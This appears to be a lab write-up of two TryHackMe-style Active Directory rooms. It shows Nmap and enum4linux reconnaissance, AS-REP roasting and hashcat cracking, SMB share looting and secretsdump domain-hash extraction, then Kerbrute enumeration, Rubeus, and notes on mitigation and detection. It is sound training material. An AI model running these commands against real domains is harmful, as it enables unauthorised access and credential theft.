## Active Directory Exploitation

### Initial Reconnaissance with Nmap

I started by running an Nmap scan to identify open ports and services on the target machine.

```bash
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-21 10:39 CEST
Nmap scan report for 10.10.20.33
Host is up (0.060s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2024-07-21T08:40:09+00:00
Service Info: Host: ATTACKTIVEDIREC; OS: Windows
```


### Enumeration with Enum4Linux

Next, I used `enum4linux` to enumerate users and shares on the target machine.

```bash
IP address       NetBIOS Name     Server    User             MAC address
------------------------------------------------------------------------------
┌─[test@router]─[/opt/impacket]
└──╼ $sudo enum4linux -a 10.10.20.33
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Jul 21 10:45:04 2024

 =========================================( Target Information )=========================================

Target ........... 10.10.20.33
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

```

Output highlights:

- **Domain Name**: THM-AD
- **Domain SID**: S-1-5-21-3591857110-2884097990-301047963

I also discovered two interesting usernames through RID cycling:
- svc-admin
- backup

### Kerberos Pre-Authentication Bruteforcing

Using `GetNPUsers.py` from Impacket, I attempted to get a Kerberos ticket-granting ticket (TGT) for the `svc-admin` user.

```bash
GetNPUsers.py THM-AD/svc-admin -dc-ip 10.10.20.33 -no-pass
```

I received a TGT hash which I cracked using `hashcat`.

```bash
hashcat -m 18200 -a 0 hash.txt passwordlist.txt
```
(get the mode from hashcat documentation)
### Accessing SMB Shares

With the cracked password, I accessed the SMB shares.

```bash
smbclient -L //10.10.20.33 -U svc-admin%password_placeholder
```

Listing and accessing the backup share revealed a potentially valuable file.

```bash
smbclient //10.10.20.33/backup -U svc-admin%password_placeholder
smb: \> ls
```

I found `backup_credentials.txt` and downloaded it.

```bash
smb: \> mget *.*
```

### Decoding Backup Credentials

The file contained a Base64 encoded string which I decoded using CyberChef.

```plaintext
backup@spookysec.local:password_placeholder
```

### Dumping Domain Credentials with SecretsDump

Using the credentials, I attempted to dump domain credentials with `secretsdump.py`.

```
Secretsdump Exploit

Description:
Secretsdump is a tool included in the Impacket library that can be used to extract sensitive data from Windows systems, including password hashes, cached credentials, and other secrets. It leverages the Microsoft Remote Procedure Call (MSRPC) protocol to connect to the target system and retrieve the data.

Attack Vector:
The Secretsdump exploit can be executed remotely or locally, depending on the attacker's access level. It typically requires valid administrative credentials or exploits that grant administrative privileges on the target system.

Exploitation Process:
1. Establish a connection to the target system using MSRPC.
2. Retrieve the Security Account Manager (SAM) database and SYSTEM hive files, which contain password hashes and other sensitive information.
3. Extract and decrypt the password hashes and cached credentials from the obtained files.

Impact:
Successful exploitation of Secretsdump can lead to the following consequences:
- Disclosure of password hashes, enabling offline password cracking attempts
- Access to cached credentials, potentially granting access to other systems or resources
- Exposure of other sensitive data, such as Kerberos tickets, private keys, or certificates

```

```bash
root@ip-10-10-236-201:/opt/impacket/examples# secretsdump.py spookysec.local/backup:placeholder@10.10.20.33
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:XXX:XXX:::

```

### Results

I successfully dumped the hashes for domain users, including the Administrator hash.

```plaintext
Administrator:500:XXX:XXX:::
```

### Conclusion

By  enumerating services, identifying vulnerable accounts, and exploiting misconfigurations, I was able to gain insights into the Active Directory environment.


#AD Room No2


## Attacking Kerberos in Active Directory

### Kerbrute

**Kerbrute** is a powerful enumeration tool used for brute-forcing and enumerating valid Active Directory users by exploiting Kerberos pre-authentication.

#### Example Usage
To enumerate valid usernames against a domain controller:
```bash
root@ip-10-10-235-137:~# ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local user.txt

__             __               __     
/ /_____  _____/ /_  _______  __/ /____ 
/ //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
/ ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/21/24 - Ronnie Flathers @ropnop

2024/07/21 18:05:16 >  Using KDC(s):
2024/07/21 18:05:16 >  	CONTROLLER.local:88

2024/07/21 18:05:16 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2024/07/21 18:05:16 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2024/07/21 18:05:16 >  Done! Tested 100 usernames (10 valid) in 0.038 seconds
root@ip-10-10-235-137:~#
```

### Rubeus

**Rubeus** is a versatile post-exploitation tool for Kerberos abuse, which can be used to perform various actions like ticket requests, overpass-the-hash, pass-the-ticket, ticket renewal, etc.

#### Example Use Cases and Detection
Any action performed using Rubeus can be detected, particularly those that deviate from typical system behavior. It can be detected through:

- **Host Detection**: Unusual process issuing raw Kerberos traffic on port 88, use of sensitive APIs like `LsaCallAuthenticationPackage()`, and the presence of abnormal tickets (e.g., use of `rc4_hmac` in tickets).
- **Network or Domain Controller Log Detection**: Detection of `rc4_hmac` instead of `aes256_cts_hmac_sha1` in Kerberos exchanges, indicative of encryption downgrades.

### Attack Techniques and Privilege Requirements

1. **Kerbrute Enumeration**: No domain access required.
2. **Pass the Ticket (PTT)**: Requires access as a user to the domain.
3. **Kerberoasting**: Requires access as any user.
4. **AS-REP Roasting**: Requires access as any user.
5. **Golden Ticket**: Requires full domain compromise (domain admin).
6. **Silver Ticket**: Requires a service hash.
7. **Skeleton Key**: Requires full domain compromise (domain admin).

### Mitigation Strategies

#### Kerberoasting Mitigation

1. **Strong Service Passwords**: Use strong passwords for service accounts to render Kerberoasting ineffective.
2. **Avoid Domain Admins as Service Accounts**: Do not make service accounts domain admins to reduce the impact of Kerberoasting.

#### Pass the Ticket Mitigation

1. **Limit Domain Admin Logons**: Domain admins should only log onto domain controllers, not low-level computers, to avoid leaving behind tickets that can be used for lateral movement.

### Silver Ticket

Silver Tickets can be used for stealthy privilege escalation. The ticket grants access to specific services without requiring interaction with the domain controller, making it harder to detect.

### General Advice

1. **Strong Password Policies**: Enforce strong passwords across the domain to prevent credential-based attacks.
2. **Network Segmentation**: Segment the network to limit the spread of lateral movement.
3. **Monitoring and Alerting**: Implement comprehensive monitoring and alerting to detect unusual activities that may indicate an ongoing attack.

### Blue Team Defense

To mitigate these attacks, the blue team should:

- Monitor and restrict the use of high-privilege accounts.
- Use detection tools and techniques to spot abnormal activities.
- Regularly review and update security policies and configurations.


Some resources:
https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a
https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat
https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1
https://www.harmj0y.net/blog/redteaming/not-a-security-boundary-breaking-forest-trusts/
https://www.varonis.com/blog/kerberos-authentication-explained/
https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It-wp.pdf
https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1493862736.pdf
https://www.redsiege.com/wp-content/uploads/2020/04/20200430-kerb101.pdf
